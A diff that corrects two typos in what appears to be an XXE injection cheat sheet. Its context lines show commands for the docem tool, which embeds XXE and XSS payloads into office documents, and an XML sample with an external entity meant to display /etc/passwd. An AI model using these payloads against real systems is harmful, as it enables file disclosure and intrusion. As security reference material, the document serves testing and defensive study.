@@ -72,7 +72,7 @@ Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`
   ```
   ruby server.rb
   ```
-- [docem](https://github.com/whitel1st/docem) - Uility to embed XXE and XSS payloads in docx,odt,pptx,etc
+- [docem](https://github.com/whitel1st/docem) - Utility to embed XXE and XSS payloads in docx,odt,pptx,etc
   ```
   ./docem.py -s samples/xxe/sample_oxml_xxe_mod0/ -pm xss -pf payloads/xss_all.txt -pt per_document -kt -sx docx
   ./docem.py -s samples/xxe/sample_oxml_xxe_mod1.docx -pm xxe -pf payloads/xxe_special_2.txt -kt -pt per_place
@@ -155,7 +155,7 @@ We try to display the content of the file `/etc/passwd`
   <contact>
     <name>Jean &xxe; Dupont</name>
     <phone>00 11 22 33 44</phone>
-    <adress>42 rue du CTF</adress>
+    <address>42 rue du CTF</address>
     <zipcode>75000</zipcode>
     <city>Paris</city>
   </contact>
